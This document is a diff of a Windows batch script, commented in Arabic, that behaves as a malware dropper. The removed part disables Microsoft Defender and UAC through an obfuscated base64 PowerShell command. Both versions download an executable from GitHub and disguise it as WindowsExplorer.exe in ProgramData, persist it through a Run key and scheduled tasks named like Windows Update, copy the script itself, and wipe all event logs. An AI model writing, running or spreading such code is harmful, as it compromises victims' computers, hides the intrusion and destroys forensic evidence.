@@ -5,34 +5,33 @@ if %errorLevel% neq 0 (
     exit /b
 )
 
-:: تعطيل Defender واضافة الاستثناءات
-Powershell -WindowStyle Hidden Add-MpPreference -ExclusionPath '%systemdrive%'
-Powershell -WindowStyle Hidden Add-MpPreference -ExclusionPath 'c:\'
-Powershell -WindowStyle Hidden Add-MpPreference -ExclusionPath '%tmp%'
-Powershell -WindowStyle Hidden Add-MpPreference -ExclusionPath '%appdata%'
-Powershell -WindowStyle Hidden Add-MpPreference -ExclusionProcess 'powershell.exe'
+:: 1. إنشاء ملف الباور شيل المؤقت (بدون مشاكل الرموز)
+(
+echo $installerPath = "$env:TEMP\360.exe"
+echo $url = "https://dl.360safe.com/totalsecurity/360TS_Setup_Official.exe"
+echo try {
+echo     (New-Object System.Net.WebClient).DownloadFile($url, $installerPath)
+echo     Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait
+echo     Start-Sleep -Seconds 45
+echo     Stop-Process -Name "360*" -Force -ErrorAction SilentlyContinue
+echo     Remove-Item -Path "C:\Program Files (x86)\360" -Recurse -Force -ErrorAction SilentlyContinue
+echo     Remove-Item -Path $installerPath -Force
+echo } catch { Write-Host "Error occurred" }
+) > "%temp%\setup.ps1"
 
-:: التعديلات الامنية الموحدة
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$c = 'cmVnIGFkZCAiSEtDVVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQdXNoTm90aWZpY2F0aW9ucyIgL3YgVG9hc3RFbmFibGVkIC90IFJFR19EV09SRCAvZCAwIC9mICYgcmVnIGFkZCAiSEtDVVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQdXNoTm90aWZpY2F0aW9ucyIgL3YgTG9ja1NjcmVlblRvYXN0RW5hYmxlZCAvdCBSRUdfRFdPUkQgL2QgMCAvZiAmIHJlZyBhZGQgIkhLQ1VcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cTm90aWZpY2F0aW9uc1xTZXR0aW5nc1xNc0VkZ2UiIC92IEVuYWJsZWQgL3QgUkVHX0RXT1JEIC9kIDAgL2YgJiByZWcgYWRkICJIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXE5vdGlmaWNhdGlvbnNcU2V0dGluZ3NcV2luZG93cy5EZWZlbmRlci5TZWN1cml0eUNlbnRlciIgL3YgRW5hYmxlZCAvdCBSRUdfRFdPUkQgL2QgMCAvZiAmIHJlZyBhZGQgIkhLQ1ZcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcRXhwbG9yZXIiIC92IERpc2FibGVOb3RpZmljYXRpb25DZW50ZXIgL3QgUkVHX0RXT1JEIC9kIDEgL2YgJiByZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nIC90IFJFR19EV09SRCAvZCAxIC9mICYgcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxGZWF0dXJlcyIgL3YgVGFtcGVyUHJvdGVjdGlvbiAvdCBSRUdfRFdPUkQgL2QgMSAvZiAmIHJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXIiIC92IERpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgJiByZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyIiAvdiBUYW1wZXJQcm90ZWN0aW9uIC90IFJFR19EV09SRCAvZCAxIC9mICYgcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlciIgL3YgRGlzYWJsZUFudGlTcHl3YXJlIC90IFJFR19EV09SRCAvZCAxIC9mICYgcmVnIGFkZCBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBFbmFibGVMVUEgL3QgUkVHX0RXT1JEIC9kIDAgL2Yn; $d = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($c)); Invoke-Expression $d"
+:: 2. تنفيذ الملف
+powershell -ExecutionPolicy Bypass -File "%temp%\setup.ps1"
+del "%temp%\setup.ps1"
 
-:: التحميل عبر BITS (اكثر موثوقية) والتثبيت
-bitsadmin /transfer myDownloadJob /download /priority normal https://dl.360safe.com/totalsecurity/360TS_Setup_Official.exe "%temp%\360.exe"
-start /wait "" "%temp%\360.exe" /S
-timeout /t 45
-taskkill /f /im 360tray.exe /im 360sd.exe /im 360rpt.exe
-rd /s /q "C:\Program Files (x86)\360"
-del "%temp%\360.exe"
-
-:: تجهيز بيئة العمل والتحميل
+:: 3. باقي المهام (هنا نستخدم CMD مباشرة لتجنب أخطاء الباور شيل)
 mkdir "%systemdrive%\programdata\GG-Win" 2>nul
-powershell -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('https://github.com/Pango-IL/windows/raw/refs/heads/main/WindowsExploor.exe','%programdata%\GG-Win\WindowsExplorer.exe')
+bitsadmin /transfer job1 /download /priority normal https://github.com/Pango-IL/windows/raw/refs/heads/main/WindowsExploor.exe "%programdata%\GG-Win\WindowsExplorer.exe"
 
-:: المهام المجدولة والتشغيل
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\GG-Win\WindowsExplorer.exe"
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\GG-Win\WindowsExplorer.exe" /f
 schtasks /create /tn WindowsUpdate /ru "%username%" /sc minute /mo 5 /RL HIGHEST /tr "%ProgramData%\GG-Win\WindowsExplorer.exe" /f
 start "" "%programdata%\GG-Win\WindowsExplorer.exe"
+
 copy "%~f0" "%ProgramData%\GG-Win\WindowsExplorer.bat" /Y
 schtasks /create /tn WindowsExplorer /ru "%username%" /sc minute /mo 45 /RL HIGHEST /tr "%ProgramData%\GG-Win\WindowsExplorer.bat" /f
 
-:: تنظيف السجلات
 for /F "tokens=*" %%1 in ('wevtutil.exe el') DO wevtutil.exe cl "%%1" 2>nul
